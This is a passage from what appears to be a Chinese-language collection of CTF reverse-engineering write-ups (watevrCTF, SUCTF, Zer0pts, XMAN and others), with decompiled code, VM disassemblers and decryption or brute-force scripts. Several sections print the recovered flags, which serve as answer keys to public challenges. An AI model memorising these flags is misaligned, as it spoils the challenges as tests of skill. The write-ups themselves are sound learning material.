rcx,[rbp-20h] 00007FF7A8AC5C21 lea rdx,[__xt_z+540h (07FF7A8ACEFE0h)] 00007FF7A8AC5C28 call _RTC_CheckStackVars (07FF7A8AC1596h) 00007FF7A8AC5C2D mov eax,edi 00007FF7A8AC5C2F mov rcx,qword ptr [rbp+208h] 00007FF7A8AC5C36 xor rcx,rbp 00007FF7A8AC5C39 call __security_check_cookie (07FF7A8AC1190h) 00007FF7A8AC5C3E lea rsp,[rbp+218h] 00007FF7A8AC5C45 pop rdi 00007FF7A8AC5C46 pop rbp 00007FF7A8AC5C47 ret 简单的说，过程就是一个循环，根据 i 的奇偶进行判断，是否与 0x42 进行异或，然后将结果以 2 位十六进制输出，所以只需要进行反向求解即可\nfrom libnum import n2s cipher = n2s(0x662e61257b26301d7972751d6b2c6f355f3a38742d74341d61776d7d7d) for i in range(len(cipher)): if i \u0026amp; 1 == 1: print (chr(cipher[i] ^ 0x42), end = \u0026#39;\u0026#39;) else: print (chr(cipher[i]), end = \u0026#39;\u0026#39;) # flag{d0_y0u_know_x86-64_a5m?} [watevrCTF 2019]Repyc 010看一眼，发现文件头好像没什么问题，直接用 uncompyle6 转成python文件\n和VN的题一样，变量都成了乱码，阅读一下然后改一改\nzero = 0 one = 1 two = 2 def function(op): i = zero list_a = [zero] * two ** (two * two) # [0] * 16 list_b = [zero] * 100 list_c = [] while op[i][zero] != \u0026#39;nop\u0026#39;: print (i, op[i]) cur = op[i][zero].lower() args = op[i][one:] if cur == \u0026#39;add\u0026#39;: list_a[args[zero]] = list_a[args[one]] + list_a[args[two]] elif cur == \u0026#39;xor\u0026#39;: list_a[args[zero]] = list_a[args[one]] ^ list_a[args[two]] elif cur == \u0026#39;sub\u0026#39;: list_a[args[zero]] = list_a[args[one]] - list_a[args[two]] elif cur == \u0026#39;mul\u0026#39;: list_a[args[zero]] = list_a[args[one]] * list_a[args[two]] elif cur == \u0026#39;div\u0026#39;: list_a[args[zero]] = list_a[args[one]] / list_a[args[two]] elif cur == \u0026#39;and\u0026#39;: list_a[args[zero]] = list_a[args[one]] \u0026amp; list_a[args[two]] elif cur == \u0026#39;or\u0026#39;: list_a[args[zero]] = list_a[args[one]] | list_a[args[two]] elif cur == \u0026#39;nothing\u0026#39;: list_a[args[zero]] = list_a[args[zero]] elif cur == \u0026#39;mov\u0026#39;: list_a[args[zero]] = args[one] elif cur == \u0026#39;set_a\u0026#39;: list_a[args[zero]] = list_b[args[one]] elif cur == \u0026#39;clear\u0026#39;: list_a[args[zero]] = zero elif cur == \u0026#39;input_b\u0026#39;: list_b[args[zero]] = input(list_a[args[one]]) elif cur == \u0026#39;print_a\u0026#39;: print(list_a[args[zero]]) elif cur == \u0026#39;c_pop\u0026#39;: i = list_c.pop() elif cur == \u0026#39;append_c\u0026#39;: list_a[7] = zero for j in range(len(list_a[args[zero]])): if list_a[args[zero]] != list_a[args[one]]: list_a[7] = one i = list_a[args[two]] list_c.append(i) elif cur == \u0026#39;xor_a\u0026#39;: str_next = \u0026#39;\u0026#39; for j in range(len(list_a[args[zero]])): str_next += chr(ord(list_a[args[zero]][j]) ^ list_a[args[one]]) list_a[args[zero]] = str_next elif cur == \u0026#39;sub_a\u0026#39;: str_next = \u0026#39;\u0026#39; for j in range(len(list_a[args[zero]])): str_next += chr(ord(list_a[args[zero]][j]) - list_a[args[one]]) list_a[args[zero]] = str_next print (list_a) print (list_b) print (list_c) print () i += one function( [ [ \u0026#39;mov\u0026#39;, zero, \u0026#39;Authentication token: \u0026#39;], # 将这个字符串放到list a的0号位置 [ \u0026#39;input_b\u0026#39;, zero, zero], # 将输入放到list b的0号位置 [ \u0026#39;mov\u0026#39;, 6, \u0026#39;á×äÓâæíäàßåÉÛãåäÉÖÓÉäàÓÉÖÓåäÉÓÚÕæïèäßÙÚÉÛÓäàÙÔÉÓâæÉàÓÚÕÓÒÙæäàÉäàßåÉßåÉäàÓÉÚÓáÉ·Ôâ×ÚÕÓÔÉ³ÚÕæïèäßÙÚÉÅä×ÚÔ×æÔÉ×Úïá×ïåÉßÉÔÙÚäÉæÓ×ÜÜïÉà×âÓÉ×ÉÑÙÙÔÉâßÔÉÖãäÉßÉæÓ×ÜÜïÉÓÚÞÙïÉäàßåÉåÙÚÑÉßÉàÙèÓÉïÙãÉáßÜÜÉÓÚÞÙïÉßäÉ×åáÓÜÜ\\x97ÉïÙãäãÖÓ\\x9aÕÙÛ\\x99á×äÕà©â«³£ï²ÕÔÈ·±â¨ë\u0026#39;], # 将这个字符串放到list a的6号位置 [ \u0026#39;mov\u0026#39;, two, two ** (3 * two + one) - two ** (two + one)], # 将120放到list a的2号位置 [ \u0026#39;mov\u0026#39;, 4, 15], # 将15放到list a的4号位置 [ \u0026#39;mov\u0026#39;, 3, one], # 将1放到list a的3号位置 [ \u0026#39;mul\u0026#39;, two, two, 3], # list a的2号位置等于2号位置*3号位置，即不变 [ \u0026#39;add\u0026#39;, two, two, 4], # list a的2号位置等于2号位置+4号位置，即120变为135 [ \u0026#39;nothing\u0026#39;, zero, two], [ \u0026#39;clear\u0026#39;, 3], # list a的3号位置清零 [ \u0026#39;xor_a\u0026#39;, 6, 3], # 6号位置中每一个字符与3异或 [ \u0026#39;mov\u0026#39;, zero, \u0026#39;Thanks.\u0026#39;], [ \u0026#39;mov\u0026#39;, one, \u0026#39;Authorizing access...\u0026#39;], [ \u0026#39;print_a\u0026#39;, zero], [ \u0026#39;set_a\u0026#39;, zero, zero], [ \u0026#39;xor_a\u0026#39;, zero, two], # 输入异或135 [ \u0026#39;sub_a\u0026#39;, zero, 4], # 输入减15 [ \u0026#39;mov\u0026#39;, 5, 19], [ \u0026#39;append_c\u0026#39;, zero, 6, 5], [ \u0026#39;print_a\u0026#39;, one], [ \u0026#39;nop\u0026#39;], [ \u0026#39;mov\u0026#39;, one, \u0026#39;Access denied!\u0026#39;], [ \u0026#39;print_a\u0026#39;, one], [ \u0026#39;nop\u0026#39;] ] ) 将过程变量输出当作动调，就比较容易看懂每条指令在干什么了\n最后发现有用的就是异或135和减15，猜flag头是 watevr，果然和密文前6个字符对上了\n所以直接一个解密就行\ncipher = \u0026#39;á×äÓâæíäàßåÉÛãåäÉÖÓÉäàÓÉÖÓåäÉÓÚÕæïèäßÙÚÉÛÓäàÙÔÉÓâæÉàÓÚÕÓÒÙæäàÉäàßåÉßåÉäàÓÉÚÓáÉ·Ôâ×ÚÕÓÔÉ³ÚÕæïèäßÙÚÉÅä×ÚÔ×æÔÉ×Úïá×ïåÉßÉÔÙÚäÉæÓ×ÜÜïÉà×âÓÉ×ÉÑÙÙÔÉâßÔÉÖãäÉßÉæÓ×ÜÜïÉÓÚÞÙïÉäàßåÉåÙÚÑÉßÉàÙèÓÉïÙãÉáßÜÜÉÓÚÞÙïÉßäÉ×åáÓÜÜ\\x97ÉïÙãäãÖÓ\\x9aÕÙÛ\\x99á×äÕà©â«³£ï²ÕÔÈ·±â¨ë\u0026#39; for c in cipher: print (chr((ord(c) + 15) ^ 135), end = \u0026#39;\u0026#39;) # watevr{this_must_be_the_best_encryption_method_evr_henceforth_this_is_the_new_Advanced_Encryption_Standard_anyways_i_dont_really_have_a_good_vid_but_i_really_enjoy_this_song_i_hope_you_will_enjoy_it_aswell!_youtube.com/watch?v=E5yFcdPAGv0} [watevrCTF 2019]esreveR 用ida打开后，发现大量与输入无关的计算，于是决定先静态跟踪一下输入，然后再动调看过程数据\n和输入有关的大概是这些（动调后写的wp，所以基地址改变了）\nfgets(s, n[0], stdin); v8 = sub_5578E4A20943(n[0]); *(_QWORD *)n = sub_5578E4A20996(v14); if ( *(_QWORD *)n != v8 ) { v11 = sub_5578E4A209E9(4521); if ( s != (char *)v11 ) { v4 = sub_5578E4A212D8((__int64)s, v15, v10, v9, v11, v13); if ( v4 != v15 * ((v12 ^ v13) - *(_QWORD *)n) ) puts(\u0026#34;Congratulations! You reversed the reversed reverse!\u0026#34;); } } 发现输入只要输入的地址不等于一个数，然后通过某个判断就行，于是再进到判断前的函数\n会看到一个输入参数很多的函数，进去看一下\nv58 = a1 == *a57; if ( a2 != a57[1] ) v58 = 0; if ( a3 != a57[2] ) v58 = 0; if ( a4 != a57[3] ) v58 = 0; if ( a5 != a57[4] ) v58 = 0; // 以下省略 输入了57个参数，而且就是判断是否相同的，相同就返回1，否则返回0\n于是猜测这里就是最终的验证函数\n中间经过了一系列动调，确定其它的过程没什么影响，于是在进入函数前下个断点，然后直接去rsp的地址里找比较的数据\n最后的内存数据\n[stack]:00007FFF9B4402F0 dq '{', 'e', 's', 'r', 'e', 'v', 'e', 'r', '_', 'r', 'e', 'v', 'e', 'r', 's', 'e' [stack]:00007FFF9B4402F0 dq 'd', '_', 'y', 'o', 'u', 't', 'u', 'b', 'e', '.', 'c', 'o', 'm', '/', 'w', 'a' [stack]:00007FFF9B4402F0 dq 't', 'c', 'h', '?', 'v', '=', 'I', '8', 'i', 'j', 'b', '4', 'Z', 'e', 'e', '5' [stack]:00007FFF9B4402F0 dq 'E', '}' 连接起来就是flag了\n{esrever_reversed_youtube.com/watch?v=I8ijb4Zee5E} firmware 一道水题，主要学习一下工控逆向\n不难看出，给的附件是squashfs文件，直接进行binwalk\n 在安装sasquatch时遇到了一些坑，好像必须clone到~/Downloads等文件夹内才行\n binwalk之后逛一下目录，能够找到一个叫做 backdoor 的二进制文件\n目标是找到连接的ip和端口，进去找一找就能看到\n[MR2020]Shit 这题最后的解法很屑（\n首先是去花，但花指令和CISCN2021-N的RE2一样，就不细说了\n一直尝试反调试，但一直没成功，就用爆破来解了\u0026hellip;\nchar __cdecl sub_DA12F0(const char *a1) { int v2; // [esp+14h] [ebp-14h]  int i; // [esp+1Ch] [ebp-Ch]  int v4; // [esp+20h] [ebp-8h]  int v5; // [esp+20h] [ebp-8h]  v2 = 0; for ( i = 0; i \u0026lt; strlen(a1); i += 4 ) { v4 = __ROR4__(a1[i + 3] | (a1[i + 2] \u0026lt;\u0026lt; 8) | (a1[i + 1] \u0026lt;\u0026lt; 16) | (a1[i] \u0026lt;\u0026lt; 24), dword_DA5034[i / 4]); v5 = ((v4 \u0026lt;\u0026lt; 16) | (unsigned __int16)~HIWORD(v4)) ^ (1 \u0026lt;\u0026lt; dword_DA5034[i / 4]); if ( i \u0026gt; 0 ) v5 ^= v2; v2 = v5; if ( v5 != dword_DA5018[i / 4] ) return 0; } return 1; } 既然每四位进行一系列位运算，且密钥只有六位，那就爆破吧\nfrom libnum import * a = [0x8C2C133A, 0x0F74CB3F6, 0x0FEDFA6F2, 0x0AB293E3B, 0x26CF8A2A, 0x88A1F279] for t in range(len(a)): for i in range(32): tmp = a[t] if t != 0: tmp = tmp ^ a[t - 1] tmp = tmp ^ (1 \u0026lt;\u0026lt; i) tmp = ((~tmp \u0026amp; 0xffff) \u0026lt;\u0026lt; 16) | (tmp \u0026gt;\u0026gt; 16) res = n2s(((tmp \u0026gt;\u0026gt; (0x20 - i)) | (tmp \u0026lt;\u0026lt; i)) \u0026amp; 0xffffffff) if res[0] \u0026gt; 0x20 and res[0] \u0026lt; 0x7f: if res[1] \u0026gt; 0x20 and res[1] \u0026lt; 0x7f: if res[2] \u0026gt; 0x20 and res[2] \u0026lt; 0x7f: if res[3] \u0026gt; 0x20 and res[3] \u0026lt; 0x7f: print (res) print () 最后甚至直接上四个 if 了\u0026hellip;\n爆破结果\nb\u0026#39;flag\u0026#39; # 必选 b\u0026#39;,ag\u0026amp;\u0026#39; b\u0026#34;a\u0026#39;f,\u0026#34; b\u0026#39;gf,!\u0026#39; b\u0026#39;_2{`\u0026#39; b\u0026#39;3{`^\u0026#39; b\u0026#39;{a_3\u0026#39; # 必选 b\u0026#39;`_3z\u0026#39; b\u0026#39;[a2}\u0026#39; b\u0026#39;a2y_\u0026#39; # 剩下三个有大括号，排除 b\u0026#39;6}_a\u0026#39; b\u0026#39;}_e2\u0026#39; b\u0026#39;re_f\u0026#39; b\u0026#39;e_gs\u0026#39; b\u0026#39;^fse\u0026#39; b\u0026#39;fsd_\u0026#39; b\u0026#39;_4o2\u0026#39; b\u0026#39;or_t\u0026#39; b\u0026#39;2_t/\u0026#39; b\u0026#39;=%st\u0026#39; b\u0026#39;est}\u0026#39; # 必选 b\u0026#39;s4=e\u0026#39; b\u0026#39;t=e3\u0026#39; 中间根据前后单词拼接一下就行了\n Shit这道题还是要看一下别人的WP，学习一下正确的思路  [SUCTF2018]HelloPython uncompyle6\n(lambda __target: [ (lambda __target: [ [ __this() for __g[\u0026#39;n\u0026#39;] in [__operator.isub(__g[\u0026#39;n\u0026#39;], 1)] ][0] for __target.value in [__operator.iadd(__target.value, (y.value \u0026lt;\u0026lt; 4) + k[2] ^ y.value + x.value ^ (y.value \u0026gt;\u0026gt; 5) + k[3])] ][0])(z) for __target.value in [__operator.iadd(__target.value, (z.value \u0026lt;\u0026lt; 4) + k[0] ^ z.value + x.value ^ (z.value \u0026gt;\u0026gt; 5) + k[1])] ][0])(y) 很明显是tea\nvoid encrypt (uint32_t* v, uint32_t* k) { uint32_t v0=v[0], v1=v[1], sum=0, i; /* set up */ uint32_t delta=0x9e3779b9; /* a key schedule constant */ uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ for (i=0; i \u0026lt; 32; i++) { /* basic cycle start */ sum += delta; v0 += ((v1\u0026lt;\u0026lt;4) + k0) ^ (v1 + sum) ^ ((v1\u0026gt;\u0026gt;5) + k1); v1 += ((v0\u0026lt;\u0026lt;4) + k2) ^ (v0 + sum) ^ ((v0\u0026gt;\u0026gt;5) + k3); } /* end cycle */ v[0]=v0; v[1]=v1; } 对比一下，z是v[1]，x是sum，y是v[0]，或者看下面这段\nfor __g[\u0026#39;x\u0026#39;] in [c_uint32(0)] ][0] for __g[\u0026#39;z\u0026#39;] in [c_uint32(v[1])] ][0] for __g[\u0026#39;y\u0026#39;] in [c_uint32(v[0])] delta常数\nfor __g[\u0026#39;u\u0026#39;] in [2654435769] 密钥常数\nfor __g[\u0026#39;k\u0026#39;] in [[3735928559, 590558003, 19088743, 4275878552]] 到题目描述里找到密文 f1f5d29b6e4414ec（这还得自己去github找，离谱）\n解密\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt;  //加密函数 void encrypt (uint32_t* v, uint32_t* k) { uint32_t v0=v[0], v1=v[1], sum=0, i; /* set up */ uint32_t delta=0x9e3779b9; /* a key schedule constant */ uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ for (i=0; i \u0026lt; 32; i++) { /* basic cycle start */ sum += delta; v0 += ((v1\u0026lt;\u0026lt;4) + k0) ^ (v1 + sum) ^ ((v1\u0026gt;\u0026gt;5) + k1); v1 += ((v0\u0026lt;\u0026lt;4) + k2) ^ (v0 + sum) ^ ((v0\u0026gt;\u0026gt;5) + k3); } /* end cycle */ v[0]=v0; v[1]=v1; } //解密函数 void decrypt (uint32_t* v, uint32_t* k) { uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i; /* set up */ uint32_t delta=0x9e3779b9; /* a key schedule constant */ uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ for (i=0; i\u0026lt;32; i++) { /* basic cycle start */ v1 -= ((v0\u0026lt;\u0026lt;4) + k2) ^ (v0 + sum) ^ ((v0\u0026gt;\u0026gt;5) + k3); v0 -= ((v1\u0026lt;\u0026lt;4) + k0) ^ (v1 + sum) ^ ((v1\u0026gt;\u0026gt;5) + k1); sum -= delta; } /* end cycle */ v[0]=v0; v[1]=v1; } int main() { uint32_t v[2]={0xf1f5d29b, 0x6e4414ec},k[4]={3735928559, 590558003, 19088743, 4275878552}; // v为要加密的数据是两个32位无符号整数  // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位  // printf(\u0026#34;加密前原始数据：%u %u\\n\u0026#34;,v[0],v[1]);  // encrypt(v, k);  // printf(\u0026#34;加密后的数据：%u %u\\n\u0026#34;,v[0],v[1]);  decrypt(v, k); printf(\u0026#34;解密后的数据：%x %x\\n\u0026#34;,v[0],v[1]); return 0; } [FBCTF]go_get_the_flag 没想到能在第五页见到memequal的题，真正的baby\n[Zer0pts2020]QR Puzzle QR文件是25*25的字符串，每一位都是字符0或1\nkey文件每一行格式为 a#(b,c)，最后存储到链表中，末尾在前，具体结构为 int b, int c, int a, 0, *next\n从加密函数来看，应该是一个vm\n简单整理一下\nvoid __fastcall sub_400BD0(__int64 a1, int *a2) { int v2; // er8  int v3; // edx  _QWORD *v4; // r9  _QWORD *v5; // rcx  int v6; // er9  __int64 v7; // rax  __int64 v8; // rcx  while ( a2 ) { x = a2[2]; y = a2[0]; z = a2[1]; if ( x == 1 ) { v2 = z; v3 = y + 1; goto LABEL_4; } if ( x == 0 ) { v2 = z; v3 = y - 1; goto LABEL_4; } if ( x == 3 ) { v2 = z + 1; v3 = y; goto LABEL_4; } if ( x == 2 ) { v2 = z - 1; v3 = y; } LABEL_4: v4 = \u0026amp;a1[z]; v5 = \u0026amp;a1[v2]; *(_BYTE *)(v7 + *v4) += *(_BYTE *)(*v5 + v3); *(_BYTE *)(v3 + *v5) = *(_BYTE *)(*v4 + v7) - *(_BYTE *)(v3 + *v5); *(_BYTE *)(*v4 + v7) -= *(_BYTE *)(*v5 + v3); // 经典swap  a2 = (int *)*((_QWORD *)a2 + 2); // a2 = a2-\u0026gt;next  } } 显然加密就是和周围某个位置交换一下\n解密和加密是对称的，直接把key文件反转过来，就是解密了\n接下来需要把01串变成图片\nfrom PIL import Image def black_block(image, x, y): for i in range(5): for j in range(5): image.putpixel((x + i, y + j), (0, 0, 0)) im = Image.new(\u0026#39;RGB\u0026#39;, (125, 125), \u0026#34;#FFFFFF\u0026#34;) flag = [ \u0026#39;1111111001000101001111111\u0026#39;, \u0026#39;1000001011001001001000001\u0026#39;, \u0026#39;1011101001110011101011101\u0026#39;, \u0026#39;1011101001100010101011101\u0026#39;, \u0026#39;1011101011000111001011101\u0026#39;, \u0026#39;1000001001110111101000001\u0026#39;, \u0026#39;1111111010101010101111111\u0026#39;, \u0026#39;0000000000101101100000000\u0026#39;, \u0026#39;1010101000001110000010010\u0026#39;, \u0026#39;0011100010000110101001001\u0026#39;, \u0026#39;1001001100011110111010011\u0026#39;, \u0026#39;1110110110001111000101000\u0026#39;, \u0026#39;0101001011011100011101011\u0026#39;, \u0026#39;0101100101111010101001011\u0026#39;, \u0026#39;1001011011011000000100111\u0026#39;, \u0026#39;0101010010001110011110011\u0026#39;, \u0026#39;1001101001110010111111000\u0026#39;, \u0026#39;0000000011110000100011001\u0026#39;, \u0026#39;1111111001100101101010111\u0026#39;, \u0026#39;1000001001010001100010000\u0026#39;, \u0026#39;1011101011101000111111011\u0026#39;, \u0026#39;1011101000111101000010000\u0026#39;, \u0026#39;1011101010111011010110101\u0026#39;, \u0026#39;1000001001001111111010010\u0026#39;, \u0026#39;1111111011110011100011011\u0026#39; ] for i in range(len(flag)): for j in range(len(flag[0])): if flag[i][j] == \u0026#39;1\u0026#39;: black_block(im, i * 5, j * 5) im.show() 扫描二维码拿flag\n[XMAN2018排位赛]easyvm vm题，上来先把字节翻译成汇编格式\nvm_code = [ 0x05, 0x01, 0x0B, 0x13, 0x03, 0x03, 0x13, 0x00, 0x00, 0x13, 0x04, 0x04, 0x28, 0x0C, 0x00, 0x33, 0x14, 0x00, 0x20, 0x05, 0x09, 0x01, 0x11, 0x09, 0x00, 0x0B, 0x0A, 0x09, 0x01, 0x04, 0x0A, 0x1B, 0x05, 0x04, 0x0C, 0x03, 0x01, 0x24, 0x03, 0x20, 0x28, 0x13, 0x00, 0x00, 0x07, 0x08, 0x05, 0x0E, 0x08, 0xE0, 0x07, 0x02, 0x08, 0x09, 0x0A, 0x02, 0x01, 0x00, 0x0A, 0x18, 0x00, 0xE0, 0x1E, 0x00, 0x05, 0x01, 0x04, 0x00, 0x13, 0x03, 0x03, 0x28, 0x09, 0x0A, 0x02, 0x01, 0x00, 0x0A, 0x18, 0x00, 0x1F, 0x20, 0x00, 0x03, 0x1B, 0x05, 0x00, 0x07, 0x08, 0x05, 0x0E, 0x08, 0xE0, 0x07, 0x02, 0x08, 0x09, 0x0A, 0x02, 0x01, 0x00, 0x0A, 0x18, 0x00, 0xE0, 0x1E, 0x00, 0x05, 0x1D, 0x05, 0x0A, 0x0D, 0x0A, 0x00, 0x1B, 0x05, 0x0A, 0x0C, 0x03, 0x01, 0x24, 0x03, 0x1F, 0x28, 0x09, 0x0A, 0x02, 0x01, 0x00, 0x0A, 0x18, 0x00, 0x1F, 0x20, 0x00, 0x03, 0x0D, 0x00, 0x04, 0x1B, 0x05, 0x00, 0x13, 0x03, 0x03, 0x03, 0x04, 0x0D, 0x28, 0x07, 0x08, 0x05, 0x0E, 0x08, 0xE0, 0x07, 0x02, 0x08, 0x09, 0x0A, 0x02, 0x01, 0x00, 0x0A, 0x1B, 0x05, 0x00, 0x01, 0x00, 0x04, 0x0D, 0x00, 0x03, 0x1D, 0x05, 0x0A, 0x13, 0x0A, 0x00, 0x1B, 0x05, 0x0A, 0x22, 0x04, 0x08, 0x0C, 0x03, 0x01, 0x24, 0x03, 0x20, 0x28, 0x13, 0x03, 0x03, 0x13, 0x04, 0x04, 0x05, 0x01, 0x0C, 0x28, 0x05, 0x09, 0x01, 0x11, 0x09, 0x03, 0x0B, 0x0A, 0x09, 0x01, 0x00, 0x0A, 0x1B, 0x05, 0x00, 0x07, 0x08, 0x05, 0x0E, 0x08, 0xDF, 0x09, 0x0A, 0x08, 0x1D, 0x05, 0x00, 0x1B, 0x05, 0x00, 0x27, 0x00, 0x0A, 0x17, 0x04, 0x07, 0x0C, 0x03, 0x01, 0x24, 0x03, 0x20, 0x28, 0x2A, 0x00, 0x00 ] index = 0 length = len(vm_code) inloop = 0 while index \u0026lt; length: v22 = vm_code[index] v6 = vm_code[index + 1] v5 = vm_code[index + 2] v21 = vm_code[index] \u0026amp; 0xFE v20 = vm_code[index] \u0026amp; 1 if v21 == 0: if v20 == 1: print (f\u0026#39;_{index}: mov v23[{v6}], v23[{v5}]\u0026#39;) if v20 == 0: print (f\u0026#39;_{index}: mov v23[{v6}], {v5}\u0026#39;) index += 2 elif v21 == 2: if v20 == 1: print (f\u0026#39;_{index}: mov32 v23[{v6}], v23[{v5}]\u0026#39;) if v20 == 0: print (f\u0026#39;_{index}: mov32 v23[{v6}], {v5}\u0026#39;) index += 2 elif v21 == 4: if v20 == 1: print (f\u0026#39;_{index}: lea_ch v23[{v6}], v23[{v5}]\u0026#39;) index += 2 elif v21 == 6: if v20 == 1: print (f\u0026#39;_{index}: lea_int v23[{v6}], v23[{v5}]\u0026#39;) index += 2 elif v21 == 8: if v20 == 1: print (f\u0026#39;_{index}: ldr_int v23[{v6}], v23[{v5}]\u0026#39;) index += 2 elif v21 == 0xA: if v20 == 1: print (f\u0026#39;_{index}: ldr_ch v23[{v6}], v23[{v5}]\u0026#39;) index += 2 elif v21 == 0xC: if v20 == 1: print (f\u0026#39;_{index}: add v23[{v6}], v23[{v5}]\u0026#39;) if v20 == 0: print (f\u0026#39;_{index}: add v23[{v6}], {v5}\u0026#39;) index += 2 elif v21 == 0xE: if v20 == 1: print (f\u0026#39;_{index}: add_pint v23[{v6}], v23[{v5}]\u0026#39;) if v20 == 0: print (f\u0026#39;_{index}: add_pint v23[{v6}], {v5}\u0026#39;) index += 2 elif v21 == 0x10: if v20 == 1: print (f\u0026#39;_{index}: add_pch v23[{v6}], v23[{v5}]\u0026#39;) if v20 == 0: print (f\u0026#39;_{index}: add_pch v23[{v6}], {v5}\u0026#39;) index += 2 elif v21 == 0x12: if v20 == 1: print (f\u0026#39;_{index}: my_xor v23[{v6}], v23[{v5}]\u0026#39;) if v20 == 0: print (f\u0026#39;_{index}: my_xor v23[{v6}], {v5}\u0026#39;) index += 2 elif v21 == 0x14: if v20 == 0: print (f\u0026#39;_{index}: mod v23[{v6}], {v5}\u0026#39;) index += 2 elif v21 == 0x16: if v20 == 1: print (f\u0026#39;_{index}: my_or v23[{v6}], v23[{v5}]\u0026#39;) if v20 == 0: print (f\u0026#39;_{index}: my_or v23[{v6}], {v5}\u0026#39;) index += 2 elif v21 == 0x18: if v20 == 1: print (f\u0026#39;_{index}: my_and v23[{v6}], v23[{v5}]\u0026#39;) if v20 == 0: print (f\u0026#39;_{index}: my_and v23[{v6}], {v5}\u0026#39;) index += 2 elif v21 == 0x1A: if v20 == 1: print (f\u0026#39;_{index}: push v23[{v6}], v23[{v5}]\u0026#39;) if v20 == 0: print (f\u0026#39;_{index}: push v23[{v6}], {v5}\u0026#39;) index += 2 elif v21 == 0x1C: if v20 == 1: print (f\u0026#39;_{index}: pop v23[{v6}], v23[{v5}]\u0026#39;) index += 2 elif v21 == 0x1E: if v20 == 1: print (f\u0026#39;_{index}: shr v23[{v6}], v23[{v5}]\u0026#39;) if v20 == 0: print (f\u0026#39;_{index}: shr v23[{v6}], {v5}\u0026#39;) index += 2 elif v21 == 0x20: if v20 == 1: print (f\u0026#39;_{index}: shl v23[{v6}], v23[{v5}]\u0026#39;) if v20 == 0: print (f\u0026#39;_{index}: shl v23[{v6}], {v5}\u0026#39;) index += 2 elif v21 == 0x22: if v20 == 1: print (f\u0026#39;_{index}: ror v23[{v6}], v23[{v5}]\u0026#39;) if v20 == 0: print (f\u0026#39;_{index}: ror v23[{v6}], {v5}\u0026#39;) index += 2 elif v21 == 0x24: if v20 == 1: print (f\u0026#39;_{index}: cmpl v23[{v6}], v23[{v5}]\u0026#39;) if v20 == 0: print (f\u0026#39;_{index}: cmpl v23[{v6}], {v5}\u0026#39;) index += 2 elif v21 == 0x26: if v20 == 1: print (f\u0026#39;_{index}: cmpeq v23[{v6}], v23[{v5}]\u0026#39;) if v20 == 0: print (f\u0026#39;_{index}: cmpeq v23[{v6}], {v5}\u0026#39;) index += 2 elif v21 == 0x28: if inloop == 0: print (f\u0026#39;\\n_{index}: start_loop\u0026#39;) inloop = 1 elif inloop == 1: print (f\u0026#39;_{index}: end_loop\\n\u0026#39;) inloop = 0 elif v21 == 0x2A: print (f\u0026#39;_{index}: judge\u0026#39;) break index += 1 转换结果\n_0: lea_ch v23[1], v23[11] _3: my_xor v23[3], v23[3] _6: my_xor v23[0], v23[0] _9: my_xor v23[4], v23[4] _12: start_loop _13: add v23[0], 51 _16: mod v23[0], 32 _19: lea_ch v23[9], v23[1] _22: add_pch v23[9], v23[0] _25: ldr_ch v23[10], v23[9] _28: mov v23[4], v23[10] _31: push v23[5], v23[4] _34: add v23[3], 1 _37: cmpl v23[3], 32 _40: end_loop _41: my_xor v23[0], v23[0] _44: lea_int v23[8], v23[5] _47: add_pint v23[8], 224 _50: lea_int v23[2], v23[8] _53: ldr_int v23[10], v23[2] _56: mov v23[0], v23[10] _59: my_and v23[0], 224 _62: shr v23[0], 5 _65: mov v23[4], v23[0] _68: my_xor v23[3], v23[3] _71: start_loop _72: ldr_int v23[10], v23[2] _75: mov v23[0], v23[10] _78: my_and v23[0], 31 _81: shl v23[0], 3 _84: push v23[5], v23[0] _87: lea_int v23[8], v23[5] _90: add_pint v23[8], 224 _93: lea_int v23[2], v23[8] _96: ldr_int v23[10], v23[2] _99: mov v23[0], v23[10] _102: my_and v23[0], 224 _105: shr v23[0], 5 _108: pop v23[5], v23[10] _111: add v23[10], v23[0] _114: push v23[5], v23[10] _117: add v23[3], 1 _120: cmpl v23[3], 31 _123: end_loop _124: ldr_int v23[10], v23[2] _127: mov v23[0], v23[10] _130: my_and v23[0], 31 _133: shl v23[0], 3 _136: add v23[0], v23[4] _139: push v23[5], v23[0] _142: my_xor v23[3], v23[3] _145: mov32 v23[4], v23[13] _148: start_loop _149: lea_int v23[8], v23[5] _152: add_pint v23[8], 224 _155: lea_int v23[2], v23[8] _158: ldr_int v23[10], v23[2] _161: mov v23[0], v23[10] _164: push v23[5], v23[0] _167: mov v23[0], v23[4] _170: add v23[0], v23[3] _173: pop v23[5], v23[10] _176: my_xor v23[10], v23[0] _179: push v23[5], v23[10] _182: ror v23[4], 8 _185: add v23[3], 1 _188: cmpl v23[3], 32 _191: end_loop _192: my_xor v23[3], v23[3] _195: my_xor v23[4], v23[4] _198: lea_ch v23[1], v23[12] _201: start_loop _202: lea_ch v23[9], v23[1] _205: add_pch v23[9], v23[3] _208: ldr_ch v23[10], v23[9] _211: mov v23[0], v23[10] _214: push v23[5], v23[0] _217: lea_int v23[8], v23[5] _220: add_pint v23[8], 223 _223: ldr_int v23[10], v23[8] _226: pop v23[5], v23[0] _229: push v23[5], v23[0] _232: cmpeq v23[0], v23[10] _235: my_or v23[4], v23[7] _238: add v23[3], 1 _241: cmpl v23[3], 32 _244: end_loop _245: judge 因为是Mach-O文件，不会动调，只能看静态了（成功被指针恶心到了，算法全靠猜）\n第一个循环就是进行了一个顺序上的转换（类似栅栏吧）\n第二个循环看到有先右移5bit，再左移3bit，一开始猜测可能是字节内部转换，后来发现在循环的前也有个右移，循环后也有个左移，代码几乎都一样，猜测是所有字节一起进行位移\n第三个循环注意到有个 ror 的循环右移，然后还有异或，就是每次异或一个字节\n最后写一个解密，从文件里dump出密文和key\ncipher = [ 0x75, 0x85, 0xD1, 0x39, 0x0B, 0x29, 0xCD, 0x77, 0x6D, 0x9F, 0x73, 0x23, 0x61, 0x8B, 0x4D, 0x45, 0x9D, 0x8F, 0x5B, 0x11, 0xC1, 0xC9, 0xE5, 0xCF, 0x45, 0xE5, 0xB1, 0xB3, 0x41, 0xD9, 0xCF, 0xCF ] key = [0xDE, 0xAD, 0xBE, 0xEF] s = 0 for i in range(32): cipher[i] ^= key[i % 4] + i cipher[i] \u0026amp;= 0xFF s \u0026lt;\u0026lt;= 8 s += cipher[i] s 